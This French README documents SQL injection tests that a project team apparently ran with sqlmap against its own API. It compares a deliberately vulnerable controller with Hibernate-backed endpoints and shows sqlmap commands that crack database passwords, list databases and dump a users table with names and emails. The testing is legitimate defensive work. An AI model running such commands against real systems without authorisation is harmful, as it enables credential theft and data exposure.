# Testes d'Injections SQL avec sqlmap

Ce projet a pour but de tester les vulnérabilités d'injections SQL dans différents endpoints d'une API. Les tests sont effectués à l'aide de l'outil `sqlmap`.

## Configuration

- **Level** : 4
- **Risk** : 2
- **Threads** : 10
- **Token** : Authorization token nécessaire pour l'API

## Prérequis

Assurez-vous que `sqlmap` est installé et que vous avez les permissions nécessaires pour exécuter les tests. Placez le script dans le répertoire de `sqlmap`.

### Model et controller testés

Par soucis de sécurité, le model utilisé ainsi que son controller, ont été déplacer du backend, dans le dossier actuel, `SQL injection`. Pour effectuer ces testes, copier coller les fichiers dans leur dossier respectifs dans le backend. 

## Script Python

Le script permet de tester plusieurs méthodes HTTP pour différents endpoints vulnérables. Le script est dans le fichier security\SQL injection\vulnerableController.py


## Exemples de Commandes et Résultats

### Tests sur un contrôleur, communiquant avec une BDD sans Hibernate (ORM)

- Commande : `python sqlmap.py -u {urls["vulnerable"]} {header} --passwords`
  - Résultat :
    ```
    [16:41:32] [INFO] cracked password 'admin' for user 'admin_tauri'
    [16:41:39] [INFO] cracked password 'root' for user 'root'
    [16:41:41] [INFO] cracked password 'root' for user 'root'
    ```

- Commande : `python sqlmap.py -u {urls["vulnerable"]} {header} --dbs`
  - Résultat :
    ```
    [16:44:17] [INFO] fetching database names
    available databases [9]:
    [*] clashofclan
    [*] entreprise
    [*] information_schema
    [*] javaee
    [*] kebabs
    [*] mysql
    [*] performance_schema
    [*] sys
    [*] tauri
    ```

- Commande : `python sqlmap.py -u {urls["vulnerable"]} {header} --tables -D tauri`
  - Résultat :
    ```
    [19:47:26] [INFO] fetching tables for database: 'tauri'
    Database: tauri
    [17 tables]
    +---------------------+
    | bonuses             |
    | comments            |
    | flags               |
    | grade_types         |
    | grades              |
    | notifications       |
    | permissions         |
    | presentation_orders |
    | projects            |
    | roles               |
    | sprints             |
    | students            |
    | teams               |
    | users               |
    | validation_bonuses  |
    | validation_flags    |
    | victims             |
    +---------------------+
    ```

- Commande : `python sqlmap.py -u {urls["vulnerable"]} {header} --dump -T users -D tauri`
  - Résultat :
    ```
    [19:49:07] [INFO] fetching entries for table 'users' in database 'tauri'
    Database: tauri
    Table: users
    [4 entries]
    +----+---------------+------------------+----------+-------------+
    | id | email         | name             | password | private_key |
    +----+---------------+------------------+----------+-------------+
    | 1  | p.l@tauri.com | WOODWARD Richard | <blank>  | <blank>     |
    | 2  | s.s@tauri.com | CLAVREUL Michael | <blank>  | <blank>     |
    | 3  | o.l@tauri.com | ROUSSEAU Sophie  | <blank>  | <blank>     |
    | 4  | t.c@tauri.com | Technique Coach  | <blank>  | <blank>     |
    +----+---------------+------------------+----------+-------------+
    ```

### Tests sur un contrôleur, communiquant avec une BDD avec Hibernate (ORM)

- Commande : `python sqlmap.py -u {urls["sprints"]} {header} --passwords`
  - Résultat :
    ```
    [19:55:33] [WARNING] GET parameter 'id' does not seem to be injectable
    ```

- Commande : `python sqlmap.py -u {urls["sprints"]} {header} --dbs`
  - Résultat :
    ```
    [19:57:11] [WARNING] GET parameter 'id' does not seem to be injectable
    ```

- Commande : `python sqlmap.py -u {urls["sprints"]} {header} --tables -D tauri`
  - Résultat :
    ```
    [19:57:54] [WARNING] GET parameter 'id' does not seem to be injectable
    ```

- Commande : `python sqlmap.py -u {urls["sprints"]} {header} --dump -T users -D tauri`
  - Résultat :
    ```
    [19:59:08] [WARNING] GET parameter 'id' does not seem to be injectable
    ```

## Conclusion

Ce projet démontre l'utilisation de `sqlmap` pour identifier et exploiter les vulnérabilités d'injection SQL dans une API. Les résultats montrent la différence entre des endpoints vulnérables et ceux protégés par des ORM comme Hibernate.
Etant donnée que la partie "Testes d'injection SQL" n'est pas demandée par le client, et par durée de mise en place, ces testes n'ont pas été effecutés sur l'ensemble des controllers. Cependant, ceux tester, utilisent l'ORM de la même façon que les autres. Donc si aucune faille n'a été trouvée, on peut supposer que cela est de même pour les autres.
